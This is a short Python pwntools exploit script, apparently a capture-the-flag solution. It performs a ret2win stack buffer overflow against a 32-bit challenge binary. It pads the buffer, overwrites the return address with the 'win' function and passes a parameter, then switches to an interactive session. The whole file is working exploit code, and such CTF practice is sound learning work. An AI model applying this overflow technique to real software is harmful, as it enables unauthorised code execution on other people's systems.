#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)

context.arch = 'i386'
gdb_script = f"""
  b *vuln
  c
  # c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

win = elf.sym.win
print(f"win: {hex(win)}")

#         vuln_buf              RBP               RIP                Fake ret address  Parameter_1
payload = p32(0xdeadbeef) * 6 + p32(0xcafebabe) + p32(elf.sym.win) + p32(0x1badb002) + p32(0x505505)
p.sendlineafter(b'pwnme> ', payload)

p.interactive()

# NOTE:
# Ret2win w param
